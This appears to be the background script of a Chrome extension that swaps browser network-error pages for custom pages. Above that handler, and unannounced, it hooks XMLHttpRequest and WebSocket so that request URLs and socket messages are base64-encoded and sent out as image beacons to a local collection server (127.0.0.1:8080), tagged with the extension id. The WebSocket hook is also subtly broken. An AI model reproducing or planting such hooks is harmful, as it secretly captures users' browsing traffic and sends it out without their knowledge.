function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.webNavigation.onErrorOccurred.addListener(function (details) {
	//search bar for most
  switch(details.error) {
    case "net::ERR_NAME_NOT_RESOLVED": //all done
      chrome.tabs.update(details.tabId, {url: chrome.extension.getURL("custerr/ddno.html#" + btoa(details.url) + "#" + btoa(details.error)) });
    break;
    case "net::ERR_INTERNET_DISCONNECTED": //all done
      chrome.tabs.update(details.tabId, {url: chrome.extension.getURL("custerr/dinodown.html#" + btoa(details.url) + "#" + btoa(details.error)) });
    break;
    case "net::DNS_PROBE_FINISHED_NXDOMAIN": // Needs proper description
      chrome.tabs.update(details.tabId, {url: chrome.extension.getURL("custerr/ddno.html#" + btoa(details.url) + "#" + btoa(details.error)) });
    break;
    case "net::ERR_CONNECTION_REFUSED": // needs blue reload button
      chrome.tabs.update(details.tabId, {url: chrome.extension.getURL("custerr/connrefused.html#" + btoa(details.url) + "#" + btoa(details.error)) });
    break;
    case "net::ERR_INVALID_URL": // add url (Full URL scheme should also be displayed under details)
      chrome.tabs.update(details.tabId, {url: chrome.extension.getURL("custerr/invalid.html#" + btoa(details.url) + "#" + btoa(details.error)) });
    break;
    default:
      console.log(details.error);
    break;
  }
});
